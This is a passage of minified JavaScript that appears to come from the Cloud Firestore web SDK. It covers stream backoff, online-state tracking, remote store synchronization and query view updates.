Sw{constructor(e,t,n=1e3,i=1.5,r=6e4){this.Ci=e,this.timerId=t,this.R_=n,this.A_=i,this.V_=r,this.d_=0,this.m_=null,this.f_=Date.now(),this.reset()}reset(){this.d_=0}g_(){this.d_=this.V_}p_(e){this.cancel();const t=Math.floor(this.d_+this.y_()),n=Math.max(0,Date.now()-this.f_),i=Math.max(0,t-n);i>0&&De("ExponentialBackoff",`Backing off for ${i} ms (base delay: ${this.d_} ms, delay with jitter: ${t} ms, last attempt: ${n} ms ago)`),this.m_=this.Ci.enqueueAfterDelay(this.timerId,i,(()=>(this.f_=Date.now(),e()))),this.d_*=this.A_,this.d_<this.R_&&(this.d_=this.R_),this.d_>this.V_&&(this.d_=this.V_)}w_(){this.m_!==null&&(this.m_.skipDelay(),this.m_=null)}cancel(){this.m_!==null&&(this.m_.cancel(),this.m_=null)}y_(){return(Math.random()-.5)*this.d_}}const E2="PersistentStream";class Cw{constructor(e,t,n,i,r,l,u,d){this.Ci=e,this.b_=n,this.S_=i,this.connection=r,this.authCredentialsProvider=l,this.appCheckCredentialsProvider=u,this.listener=d,this.state=0,this.D_=0,this.C_=null,this.v_=null,this.stream=null,this.F_=0,this.M_=new Sw(e,t)}x_(){return this.state===1||this.state===5||this.O_()}O_(){return this.state===2||this.state===3}start(){this.F_=0,this.state!==4?this.auth():this.N_()}async stop(){this.x_()&&await this.close(0)}B_(){this.state=0,this.M_.reset()}L_(){this.O_()&&this.C_===null&&(this.C_=this.Ci.enqueueAfterDelay(this.b_,6e4,(()=>this.k_())))}K_(e){this.q_(),this.stream.send(e)}async k_(){if(this.O_())return this.close(0)}q_(){this.C_&&(this.C_.cancel(),this.C_=null)}U_(){this.v_&&(this.v_.cancel(),this.v_=null)}async close(e,t){this.q_(),this.U_(),this.M_.cancel(),this.D_++,e!==4?this.M_.reset():t&&t.code===Se.RESOURCE_EXHAUSTED?(Jo(t.toString()),Jo("Using maximum backoff delay to prevent overloading the backend."),this.M_.g_()):t&&t.code===Se.UNAUTHENTICATED&&this.state!==3&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),this.stream!==null&&(this.W_(),this.stream.close(),this.stream=null),this.state=e,await this.listener.t_(t)}W_(){}auth(){this.state=1;const e=this.Q_(this.D_),t=this.D_;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then((([n,i])=>{this.D_===t&&this.G_(n,i)}),(n=>{e((()=>{const i=new ke(Se.UNKNOWN,"Fetching auth token failed: "+n.message);return this.z_(i)}))}))}G_(e,t){const n=this.Q_(this.D_);this.stream=this.j_(e,t),this.stream.Zo((()=>{n((()=>this.listener.Zo()))})),this.stream.Yo((()=>{n((()=>(this.state=2,this.v_=this.Ci.enqueueAfterDelay(this.S_,1e4,(()=>(this.O_()&&(this.state=3),Promise.resolve()))),this.listener.Yo())))})),this.stream.t_((i=>{n((()=>this.z_(i)))})),this.stream.onMessage((i=>{n((()=>++this.F_==1?this.H_(i):this.onNext(i)))}))}N_(){this.state=5,this.M_.p_((async()=>{this.state=0,this.start()}))}z_(e){return De(E2,`close with error: ${e}`),this.stream=null,this.close(4,e)}Q_(e){return t=>{this.Ci.enqueueAndForget((()=>this.D_===e?t():(De(E2,"stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve())))}}}class g6 extends Cw{constructor(e,t,n,i,r,l){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",t,n,i,l),this.serializer=r}j_(e,t){return this.connection.T_("Listen",e,t)}H_(e){return this.onNext(e)}onNext(e){this.M_.reset();const t=CU(this.serializer,e),n=(function(r){if(!("targetChange"in r))return Ke.min();const l=r.targetChange;return l.targetIds&&l.targetIds.length?Ke.min():l.readTime?io(l.readTime):Ke.min()})(e);return this.listener.J_(t,n)}Z_(e){const t={};t.database=s0(this.serializer),t.addTarget=(function(r,l){let u;const d=l.target;if(u=a0(d)?{documents:AU(r,d)}:{query:PU(r,d).ft},u.targetId=l.targetId,l.resumeToken.approximateByteSize()>0){u.resumeToken=cw(r,l.resumeToken);const p=n0(r,l.expectedCount);p!==null&&(u.expectedCount=p)}else if(l.snapshotVersion.compareTo(Ke.min())>0){u.readTime=gh(r,l.snapshotVersion.toTimestamp());const p=n0(r,l.expectedCount);p!==null&&(u.expectedCount=p)}return u})(this.serializer,e);const n=RU(this.serializer,e);n&&(t.labels=n),this.K_(t)}X_(e){const t={};t.database=s0(this.serializer),t.removeTarget=e,this.K_(t)}}class b6 extends Cw{constructor(e,t,n,i,r,l){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",t,n,i,l),this.serializer=r}get Y_(){return this.F_>0}start(){this.lastStreamToken=void 0,super.start()}W_(){this.Y_&&this.ea([])}j_(e,t){return this.connection.T_("Write",e,t)}H_(e){return Aa(!!e.streamToken,31322),this.lastStreamToken=e.streamToken,Aa(!e.writeResults||e.writeResults.length===0,55816),this.listener.ta()}onNext(e){Aa(!!e.streamToken,12678),this.lastStreamToken=e.streamToken,this.M_.reset();const t=xU(e.writeResults,e.commitTime),n=io(e.commitTime);return this.listener.na(n,t)}ra(){const e={};e.database=s0(this.serializer),this.K_(e)}ea(e){const t={streamToken:this.lastStreamToken,writes:e.map((n=>TU(this.serializer,n)))};this.K_(t)}}class v6{}class y6 extends v6{constructor(e,t,n,i){super(),this.authCredentials=e,this.appCheckCredentials=t,this.connection=n,this.serializer=i,this.ia=!1}sa(){if(this.ia)throw new ke(Se.FAILED_PRECONDITION,"The client has already been terminated.")}Wo(e,t,n,i){return this.sa(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([r,l])=>this.connection.Wo(e,i0(t,n),i,r,l))).catch((r=>{throw r.name==="FirebaseError"?(r.code===Se.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),r):new ke(Se.UNKNOWN,r.toString())}))}jo(e,t,n,i,r){return this.sa(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([l,u])=>this.connection.jo(e,i0(t,n),i,l,u,r))).catch((l=>{throw l.name==="FirebaseError"?(l.code===Se.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),l):new ke(Se.UNKNOWN,l.toString())}))}terminate(){this.ia=!0,this.connection.terminate()}}function E6(a,e,t,n){return new y6(a,e,t,n)}class S6{constructor(e,t){this.asyncQueue=e,this.onlineStateHandler=t,this.state="Unknown",this.oa=0,this._a=null,this.aa=!0}ua(){this.oa===0&&(this.ca("Unknown"),this._a=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,(()=>(this._a=null,this.la("Backend didn't respond within 10 seconds."),this.ca("Offline"),Promise.resolve()))))}ha(e){this.state==="Online"?this.ca("Unknown"):(this.oa++,this.oa>=1&&(this.Pa(),this.la(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.ca("Offline")))}set(e){this.Pa(),this.oa=0,e==="Online"&&(this.aa=!1),this.ca(e)}ca(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}la(e){const t=`Could not reach Cloud Firestore backend. ${e}
This typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.aa?(Jo(t),this.aa=!1):De("OnlineStateTracker",t)}Pa(){this._a!==null&&(this._a.cancel(),this._a=null)}}const rl="RemoteStore";class C6{constructor(e,t,n,i,r){this.localStore=e,this.datastore=t,this.asyncQueue=n,this.remoteSyncer={},this.Ta=[],this.Ia=new Map,this.Ea=new Set,this.Ra=[],this.Aa=r,this.Aa.Mo((l=>{n.enqueueAndForget((async()=>{fl(this)&&(De(rl,"Restarting streams for network reachability change."),await(async function(d){const p=$e(d);p.Ea.add(4),await Cp(p),p.Va.set("Unknown"),p.Ea.delete(4),await ig(p)})(this))}))})),this.Va=new S6(n,i)}}async function ig(a){if(fl(a))for(const e of a.Ra)await e(!0)}async function Cp(a){for(const e of a.Ra)await e(!1)}function Tw(a,e){const t=$e(a);t.Ia.has(e.targetId)||(t.Ia.set(e.targetId,e),_E(t)?NE(t):Gc(t).O_()&&ME(t,e))}function DE(a,e){const t=$e(a),n=Gc(t);t.Ia.delete(e),n.O_()&&xw(t,e),t.Ia.size===0&&(n.O_()?n.L_():fl(t)&&t.Va.set("Unknown"))}function ME(a,e){if(a.da.$e(e.targetId),e.resumeToken.approximateByteSize()>0||e.snapshotVersion.compareTo(Ke.min())>0){const t=a.remoteSyncer.getRemoteKeysForTarget(e.targetId).size;e=e.withExpectedCount(t)}Gc(a).Z_(e)}function xw(a,e){a.da.$e(e),Gc(a).X_(e)}function NE(a){a.da=new hU({getRemoteKeysForTarget:e=>a.remoteSyncer.getRemoteKeysForTarget(e),At:e=>a.Ia.get(e)||null,ht:()=>a.datastore.serializer.databaseId}),Gc(a).start(),a.Va.ua()}function _E(a){return fl(a)&&!Gc(a).x_()&&a.Ia.size>0}function fl(a){return $e(a).Ea.size===0}function Aw(a){a.da=void 0}async function T6(a){a.Va.set("Online")}async function x6(a){a.Ia.forEach(((e,t)=>{ME(a,e)}))}async function A6(a,e){Aw(a),_E(a)?(a.Va.ha(e),NE(a)):a.Va.set("Unknown")}async function P6(a,e,t){if(a.Va.set("Online"),e instanceof lw&&e.state===2&&e.cause)try{await(async function(i,r){const l=r.cause;for(const u of r.targetIds)i.Ia.has(u)&&(await i.remoteSyncer.rejectListen(u,l),i.Ia.delete(u),i.da.removeTarget(u))})(a,e)}catch(n){De(rl,"Failed to remove targets %s: %s ",e.targetIds.join(","),n),await vh(a,n)}else if(e instanceof Of?a.da.Xe(e):e instanceof rw?a.da.st(e):a.da.tt(e),!t.isEqual(Ke.min()))try{const n=await Ew(a.localStore);t.compareTo(n)>=0&&await(function(r,l){const u=r.da.Tt(l);return u.targetChanges.forEach(((d,p)=>{if(d.resumeToken.approximateByteSize()>0){const f=r.Ia.get(p);f&&r.Ia.set(p,f.withResumeToken(d.resumeToken,l))}})),u.targetMismatches.forEach(((d,p)=>{const f=r.Ia.get(d);if(!f)return;r.Ia.set(d,f.withResumeToken(Ut.EMPTY_BYTE_STRING,f.snapshotVersion)),xw(r,d);const h=new Bs(f.target,d,p,f.sequenceNumber);ME(r,h)})),r.remoteSyncer.applyRemoteEvent(u)})(a,t)}catch(n){De(rl,"Failed to raise snapshot:",n),await vh(a,n)}}async function vh(a,e,t){if(!Hc(e))throw e;a.Ea.add(1),await Cp(a),a.Va.set("Offline"),t||(t=()=>Ew(a.localStore)),a.asyncQueue.enqueueRetryable((async()=>{De(rl,"Retrying IndexedDB access"),await t(),a.Ea.delete(1),await ig(a)}))}function Pw(a,e){return e().catch((t=>vh(a,t,e)))}async function og(a){const e=$e(a),t=ar(e);let n=e.Ta.length>0?e.Ta[e.Ta.length-1].batchId:yE;for(;L6(e);)try{const i=await r6(e.localStore,n);if(i===null){e.Ta.length===0&&t.L_();break}n=i.batchId,R6(e,i)}catch(i){await vh(e,i)}Lw(e)&&Rw(e)}function L6(a){return fl(a)&&a.Ta.length<10}function R6(a,e){a.Ta.push(e);const t=ar(a);t.O_()&&t.Y_&&t.ea(e.mutations)}function Lw(a){return fl(a)&&!ar(a).x_()&&a.Ta.length>0}function Rw(a){ar(a).start()}async function I6(a){ar(a).ra()}async function w6(a){const e=ar(a);for(const t of a.Ta)e.ea(t.mutations)}async function j6(a,e,t){const n=a.Ta.shift(),i=AE.from(n,e,t);await Pw(a,(()=>a.remoteSyncer.applySuccessfulWrite(i))),await og(a)}async function D6(a,e){e&&ar(a).Y_&&await(async function(n,i){if((function(l){return pU(l)&&l!==Se.ABORTED})(i.code)){const r=n.Ta.shift();ar(n).B_(),await Pw(n,(()=>n.remoteSyncer.rejectFailedWrite(r.batchId,i))),await og(n)}})(a,e),Lw(a)&&Rw(a)}async function S2(a,e){const t=$e(a);t.asyncQueue.verifyOperationInProgress(),De(rl,"RemoteStore received new credentials");const n=fl(t);t.Ea.add(3),await Cp(t),n&&t.Va.set("Unknown"),await t.remoteSyncer.handleCredentialChange(e),t.Ea.delete(3),await ig(t)}async function M6(a,e){const t=$e(a);e?(t.Ea.delete(2),await ig(t)):e||(t.Ea.add(2),await Cp(t),t.Va.set("Unknown"))}function Gc(a){return a.ma||(a.ma=(function(t,n,i){const r=$e(t);return r.sa(),new g6(n,r.connection,r.authCredentials,r.appCheckCredentials,r.serializer,i)})(a.datastore,a.asyncQueue,{Zo:T6.bind(null,a),Yo:x6.bind(null,a),t_:A6.bind(null,a),J_:P6.bind(null,a)}),a.Ra.push((async e=>{e?(a.ma.B_(),_E(a)?NE(a):a.Va.set("Unknown")):(await a.ma.stop(),Aw(a))}))),a.ma}function ar(a){return a.fa||(a.fa=(function(t,n,i){const r=$e(t);return r.sa(),new b6(n,r.connection,r.authCredentials,r.appCheckCredentials,r.serializer,i)})(a.datastore,a.asyncQueue,{Zo:()=>Promise.resolve(),Yo:I6.bind(null,a),t_:D6.bind(null,a),ta:w6.bind(null,a),na:j6.bind(null,a)}),a.Ra.push((async e=>{e?(a.fa.B_(),await og(a)):(await a.fa.stop(),a.Ta.length>0&&(De(rl,`Stopping write stream with ${a.Ta.length} pending writes`),a.Ta=[]))}))),a.fa}class qE{constructor(e,t,n,i,r){this.asyncQueue=e,this.timerId=t,this.targetTimeMs=n,this.op=i,this.removalCallback=r,this.deferred=new Ws,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch((l=>{}))}get promise(){return this.deferred.promise}static createAndSchedule(e,t,n,i,r){const l=Date.now()+n,u=new qE(e,t,l,i,r);return u.start(n),u}start(e){this.timerHandle=setTimeout((()=>this.handleDelayElapsed()),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){this.timerHandle!==null&&(this.clearTimeout(),this.deferred.reject(new ke(Se.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget((()=>this.timerHandle!==null?(this.clearTimeout(),this.op().then((e=>this.deferred.resolve(e)))):Promise.resolve()))}clearTimeout(){this.timerHandle!==null&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}function kE(a,e){if(Jo("AsyncQueue",`${e}: ${a}`),Hc(a))return new ke(Se.UNAVAILABLE,`${e}: ${a}`);throw a}class Cc{static emptySet(e){return new Cc(e.comparator)}constructor(e){this.comparator=e?(t,n)=>e(t,n)||Be.comparator(t.key,n.key):(t,n)=>Be.comparator(t.key,n.key),this.keyedMap=Ed(),this.sortedSet=new Wa(this.comparator)}has(e){return this.keyedMap.get(e)!=null}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){const t=this.keyedMap.get(e);return t?this.sortedSet.indexOf(t):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal(((t,n)=>(e(t),!1)))}add(e){const t=this.delete(e.key);return t.copy(t.keyedMap.insert(e.key,e),t.sortedSet.insert(e,null))}delete(e){const t=this.get(e);return t?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(t)):this}isEqual(e){if(!(e instanceof Cc)||this.size!==e.size)return!1;const t=this.sortedSet.getIterator(),n=e.sortedSet.getIterator();for(;t.hasNext();){const i=t.getNext().key,r=n.getNext().key;if(!i.isEqual(r))return!1}return!0}toString(){const e=[];return this.forEach((t=>{e.push(t.toString())})),e.length===0?"DocumentSet ()":`DocumentSet (
  `+e.join(`  
`)+`
)`}copy(e,t){const n=new Cc;return n.comparator=this.comparator,n.keyedMap=e,n.sortedSet=t,n}}class C2{constructor(){this.ga=new Wa(Be.comparator)}track(e){const t=e.doc.key,n=this.ga.get(t);n?e.type!==0&&n.type===3?this.ga=this.ga.insert(t,e):e.type===3&&n.type!==1?this.ga=this.ga.insert(t,{type:n.type,doc:e.doc}):e.type===2&&n.type===2?this.ga=this.ga.insert(t,{type:2,doc:e.doc}):e.type===2&&n.type===0?this.ga=this.ga.insert(t,{type:0,doc:e.doc}):e.type===1&&n.type===0?this.ga=this.ga.remove(t):e.type===1&&n.type===2?this.ga=this.ga.insert(t,{type:1,doc:n.doc}):e.type===0&&n.type===1?this.ga=this.ga.insert(t,{type:2,doc:e.doc}):Ge(63341,{Vt:e,pa:n}):this.ga=this.ga.insert(t,e)}ya(){const e=[];return this.ga.inorderTraversal(((t,n)=>{e.push(n)})),e}}class Nc{constructor(e,t,n,i,r,l,u,d,p){this.query=e,this.docs=t,this.oldDocs=n,this.docChanges=i,this.mutatedKeys=r,this.fromCache=l,this.syncStateChanged=u,this.excludesMetadataChanges=d,this.hasCachedResults=p}static fromInitialDocuments(e,t,n,i,r){const l=[];return t.forEach((u=>{l.push({type:0,doc:u})})),new Nc(e,t,Cc.emptySet(t),l,n,i,!0,!1,r)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&Xh(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;const t=this.docChanges,n=e.docChanges;if(t.length!==n.length)return!1;for(let i=0;i<t.length;i++)if(t[i].type!==n[i].type||!t[i].doc.isEqual(n[i].doc))return!1;return!0}}class N6{constructor(){this.wa=void 0,this.ba=[]}Sa(){return this.ba.some((e=>e.Da()))}}class _6{constructor(){this.queries=T2(),this.onlineState="Unknown",this.Ca=new Set}terminate(){(function(t,n){const i=$e(t),r=i.queries;i.queries=T2(),r.forEach(((l,u)=>{for(const d of u.ba)d.onError(n)}))})(this,new ke(Se.ABORTED,"Firestore shutting down"))}}function T2(){return new pl((a=>JI(a)),Xh)}async function Iw(a,e){const t=$e(a);let n=3;const i=e.query;let r=t.queries.get(i);r?!r.Sa()&&e.Da()&&(n=2):(r=new N6,n=e.Da()?0:1);try{switch(n){case 0:r.wa=await t.onListen(i,!0);break;case 1:r.wa=await t.onListen(i,!1);break;case 2:await t.onFirstRemoteStoreListen(i)}}catch(l){const u=kE(l,`Initialization of query '${cc(e.query)}' failed`);return void e.onError(u)}t.queries.set(i,r),r.ba.push(e),e.va(t.onlineState),r.wa&&e.Fa(r.wa)&&OE(t)}async function ww(a,e){const t=$e(a),n=e.query;let i=3;const r=t.queries.get(n);if(r){const l=r.ba.indexOf(e);l>=0&&(r.ba.splice(l,1),r.ba.length===0?i=e.Da()?0:1:!r.Sa()&&e.Da()&&(i=2))}switch(i){case 0:return t.queries.delete(n),t.onUnlisten(n,!0);case 1:return t.queries.delete(n),t.onUnlisten(n,!1);case 2:return t.onLastRemoteStoreUnlisten(n);default:return}}function q6(a,e){const t=$e(a);let n=!1;for(const i of e){const r=i.query,l=t.queries.get(r);if(l){for(const u of l.ba)u.Fa(i)&&(n=!0);l.wa=i}}n&&OE(t)}function k6(a,e,t){const n=$e(a),i=n.queries.get(e);if(i)for(const r of i.ba)r.onError(t);n.queries.delete(e)}function OE(a){a.Ca.forEach((e=>{e.next()}))}var c0,x2;(x2=c0||(c0={})).Ma="default",x2.Cache="cache";class jw{constructor(e,t,n){this.query=e,this.xa=t,this.Oa=!1,this.Na=null,this.onlineState="Unknown",this.options=n||{}}Fa(e){if(!this.options.includeMetadataChanges){const n=[];for(const i of e.docChanges)i.type!==3&&n.push(i);e=new Nc(e.query,e.docs,e.oldDocs,n,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let t=!1;return this.Oa?this.Ba(e)&&(this.xa.next(e),t=!0):this.La(e,this.onlineState)&&(this.ka(e),t=!0),this.Na=e,t}onError(e){this.xa.error(e)}va(e){this.onlineState=e;let t=!1;return this.Na&&!this.Oa&&this.La(this.Na,e)&&(this.ka(this.Na),t=!0),t}La(e,t){if(!e.fromCache||!this.Da())return!0;const n=t!=="Offline";return(!this.options.Ka||!n)&&(!e.docs.isEmpty()||e.hasCachedResults||t==="Offline")}Ba(e){if(e.docChanges.length>0)return!0;const t=this.Na&&this.Na.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!t)&&this.options.includeMetadataChanges===!0}ka(e){e=Nc.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.Oa=!0,this.xa.next(e)}Da(){return this.options.source!==c0.Cache}}class Dw{constructor(e){this.key=e}}class Mw{constructor(e){this.key=e}}class O6{constructor(e,t){this.query=e,this.Za=t,this.Xa=null,this.hasCachedResults=!1,this.current=!1,this.Ya=pa(),this.mutatedKeys=pa(),this.eu=WI(e),this.tu=new Cc(this.eu)}get nu(){return this.Za}ru(e,t){const n=t?t.iu:new C2,i=t?t.tu:this.tu;let r=t?t.mutatedKeys:this.mutatedKeys,l=i,u=!1;const d=this.query.limitType==="F"&&i.size===this.query.limit?i.last():null,p=this.query.limitType==="L"&&i.size===this.query.limit?i.first():null;if(e.inorderTraversal(((f,h)=>{const E=i.get(f),C=Zh(this.query,h)?h:null,A=!!E&&this.mutatedKeys.has(E.key),j=!!C&&(C.hasLocalMutations||this.mutatedKeys.has(C.key)&&C.hasCommittedMutations);let R=!1;E&&C?E.data.isEqual(C.data)?A!==j&&(n.track({type:3,doc:C}),R=!0):this.su(E,C)||(n.track({type:2,doc:C}),R=!0,(d&&this.eu(C,d)>0||p&&this.eu(C,p)<0)&&(u=!0)):!E&&C?(n.track({type:0,doc:C}),R=!0):E&&!C&&(n.track({type:1,doc:E}),R=!0,(d||p)&&(u=!0)),R&&(C?(l=l.add(C),r=j?r.add(f):r.delete(f)):(l=l.delete(f),r=r.delete(f)))})),this.query.limit!==null)for(;l.size>this.query.limit;){const f=this.query.limitType==="F"?l.last():l.first();l=l.delete(f.key),r=r.delete(f.key),n.track({type:1,doc:f})}return{tu:l,iu:n,Ss:u,mutatedKeys:r}}su(e,t){return e.hasLocalMutations&&t.hasCommittedMutations&&!t.hasLocalMutations}applyChanges(e,t,n,i){const r=this.tu;this.tu=e.tu,this.mutatedKeys=e.mutatedKeys;const l=e.iu.ya();l.sort(((f,h)=>(function(C,A){const j=R=>{switch(R){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return Ge(20277,{Vt:R})}};return j(C)-j(A)})(f.type,h.type)||this.eu(f.doc,h.doc))),this.ou(n),i=i??!1;const u=t&&!i?this._u():[],d=this.Ya.size===0&&this.current&&!i?1:0,p=d!==this.Xa;return this.Xa=d,l.length!==0||p?{snapshot:new Nc(this.query,e.tu,r,l,e.mutatedKeys,d===0,p,!1,!!n&&n.resumeToken.approximateByteSize()>0),au:u}:{au:u}}va(e){return this.current&&e==="Offline"?(this.current=!1,this.applyChanges({tu:this.tu,iu:new C2,mutatedKeys:this.mutatedKeys,Ss:!1},!1)):{au:[]}}uu(e){return!this.Za.has(e)&&!!this.tu.has(e)&&!this.tu.get(e).hasLocalMutations}ou(e){e&&(e.addedDocuments.forEach((t=>this.Za=this.Za.add(t))),e.modifiedDocuments.forEach((t=>{})),e.removedDocuments.forEach((t=>this.Za=this.Za.delete(t))),this.current=e.current)}_u(){if(!this.current)return[];const e=this.Ya;this.Ya=pa(),this.tu.forEach((n=>{this.uu(n.key)&&(this.Ya=this.Ya.add(n.key))}));const t=[];return e.forEach((n=>{this.Ya.has(n)||t.push(new Mw(n))})),this.Ya.forEach((n=>{e.has(n)||t.push(new Dw(n))})),t}cu(e){this.Za=e.ks,this.Ya=pa();const t=this.ru(e.documents);return this.applyChanges(t,!0)}lu(){return Nc.fromInitialDocuments(this.query,this.tu,this.mutatedKeys,this.Xa===0,this.hasCachedResults)}}const UE="SyncEngine";class U6{constructor(e,t,n){this.query=e,this.targetId=t,this.view=n}}class z6{constructor(e){this.key=e,this.hu=!1}}class B6{constructor(e,t,n,i,r,l){this.localStore=e,this.remoteStore=t,this.eventManager=n,this.sharedClientState=i,this.currentUser=r,this.maxConcurrentLimboResolutions=l,this.Pu={},this.Tu=new pl((u=>JI(u)),Xh),this.Iu=new Map,this.Eu=new Set,this.Ru=new Wa(Be.comparator),this.Au=new Map,this.Vu=new RE,this.du={},this.mu=new Map,this.fu=Mc.ar(),this.onlineState="Unknown",this.gu=void 0}get isPrimaryClient(){return this.gu===!0}}async function F6(a,e,t=!0){const n=Uw(a);let i;const r=n.Tu.get(e);return r?(n.sharedClientState.addLocalQueryTarget(r.targetId),i=r.view.lu()):i=await Nw(n,e,t,!0),i}async function V6(a,e){const t=Uw(a);await Nw(t,e,!0,!1)}async function Nw(a,e,t,n){const i=await l6(a.localStore,no(e)),r=i.targetId,l=a.sharedClientState.addLocalQueryTarget(r,t);let u;return n&&(u=await H6(a,e,r,l==="current",i.resumeToken)),a.isPrimaryClient&&t&&Tw(a.remoteStore,i),u}async function H6(a,e,t,n,i){a.pu=(h,E,C)=>(async function(j,R,I,w){let k=R.view.ru(I);k.Ss&&(k=await g2(j.localStore,R.query,!1).then((({documents:q})=>R.view.ru(q,k))));const Y=w&&w.targetChanges.get(R.targetId),ee=w&&w.targetMismatches.get(R.targetId)!=null,Q=R.view.applyChanges(k,j.isPrimaryClient,Y,ee);return P2(j,R.targetId,Q.au),Q.snapshot})(a,h,E,C);const r=await g2(a.localStore,e,!0),l=new O6(e,r.ks),u=l.ru(r.documents),d=Sp.createSynthesizedTargetChangeForCurrentChange(t,n&&a.onlineState!=="Offline",i),p=l.applyChanges(u,a.isPrimaryClient,d);P2(a,t,p.au);const f=new U6(e,t,l);return a.Tu.set(e,f),a.Iu.has(t)?a.Iu.get(t).push(e):a.Iu.set(t,[e]),p.snapshot}async function G6(a,e,t){const n=$e(a),i=n.Tu.get(e),r=n.Iu.get(i.targetId);if(r.length>1)return n.Iu.set(i.targetId,r.filter((l=>!Xh(l,e)))),void n.Tu.delete(e);n.isPrimaryClient?(n.sharedClientState.removeLocalQueryTarget(i.targetId),n.sharedClientState.isActiveQueryTarget(i.targetId)||await r0(n.localStore,i.targetId,!1).then((()=>{n.sharedClientState.clearQueryState(i.targetId),t&&DE(n.remoteStore,i.targetId),u0(n,i.targetId)})).catch(Vc)):(u0(n,i.targetId),await r0(n.localStore,i.targetId,!0))}async function Q6(a,e){const t=$e(a),n=t.Tu.get(e),i=t.Iu.get(n.targetId);t.isPrimaryClient&&i.length===1&&(t.sharedClientState.removeLocalQueryTarget(n.targetId),DE(t.remoteStore,n.targetId))}async function J6(a,e,t){const n=ez(a);try{const i=await(function(l,u){const d=$e(l),p=Ua.now(),f=u.reduce(((C,A)=>C.add(A.key)),pa());let h,E;return d.persistence.runTransaction("Locally write mutations","readwrite",(C=>{let A=Wo(),j=pa();return d.xs.getEntries(C,f).next((R=>{A=R,A.forEach(((I,w)=>{w.isValidDocument()||(j=j.add(I))}))})).next((()=>d.localDocuments.getOverlayedDocuments(C,A))).next((R=>{h=R;const I=[];for(const w of u){const k=rU(w,h.get(w.key).overlayedDocument);k!=null&&I.push(new ml(w.key,k,zI(k.value.mapValue),Fo.exists(!0)))}return d.mutationQueue.addMutationBatch(C,p,I,u)})).next((R=>{E=R;const I=R.applyToLocalDocumentSet(h,j);return d.documentOverlayCache.saveOverlays(C,R.batchId,I)}))})).then((()=>({batchId:E.batchId,changes:YI(h)})))})(n.localStore,e);n.sharedClientState.addPendingMutation(i.batchId),(function(l,u,d){let p=l.du[l.currentUser.toKey()];p||(p=new Wa(da)),p=p.insert(u,d),l.du[l.currentUser.toKey()]=p})(n,i.batchId,t),await Tp(n,i.changes),await og(n.remoteStore)}catch(i){const r=kE(i,"Failed to persist write");t.reject(r)}}async function _w(a,e){const t=$e(a);try{const n=await o6(t.localStore,e);e.targetChanges.forEach(((i,r)=>{const l=t.Au.get(r);l&&(Aa(i.addedDocuments.size+i.modifiedDocuments.size+i.removedDocuments.size<=1,22616),i.addedDocuments.size>0?l.hu=!0:i.modifiedDocuments.size>0?Aa(l.hu,14607):i.removedDocuments.size>0&&(Aa(l.hu,42227),l.hu=!1))})),await Tp(t,n,e)}catch(n){await Vc(n)}}function A2(a,e,t){const n=$e(a);if(n.isPrimaryClient&&t===0||!n.isPrimaryClient&&t===1){const i=[];n.Tu.forEach(((r,l)=>{const u=l.view.va(e);u.snapshot&&i.push(u.snapshot)})),(function(l,u){const d=$e(l);d.onlineState=u;let p=!1;d.queries.forEach(((f,h)=>{for(const E of h.ba)E.va(u)&&(p=!0)})),p&&OE(d)})(n.eventManager,e),i.length&&n.Pu.J_(i),n.onlineState=e,n.isPrimaryClient&&n.sharedClientState.setOnlineState(e)}}async function W6(a,e,t){const n=$e(a);n.sharedClientState.updateQueryState(e,"rejected",t);const i=n.Au.get(e),r=i&&i.key;if(r){let l=new Wa(Be.comparator);l=l.insert(r,Ht.newNoDocument(r,Ke.min()));const u=pa().add(r),d=new tg(Ke.min(),new Map,new Wa(da),l,u);await _w(n,d),n.Ru=n.Ru.remove(r),n.Au.delete(e),zE(n)}else await r0(n.localStore,e,!1).then((()=>u0(n,e,t))).catch(Vc)}async function K6(a,e){const t=$e(a),n=e.batch.batchId;try{const i=await i6(t.localStore,e);kw(t,n,null),qw(t,n),t.sharedClientState.updateMutationState(n,"acknowledged"),await Tp(t,i)}catch(i){await Vc(i)}}async function Y6(a,e,t){const n=$e(a);try{const i=await(function(l,u){const d=$e(l);return d.persistence.runTransaction("Reject batch","readwrite-primary",(p=>{let f;return 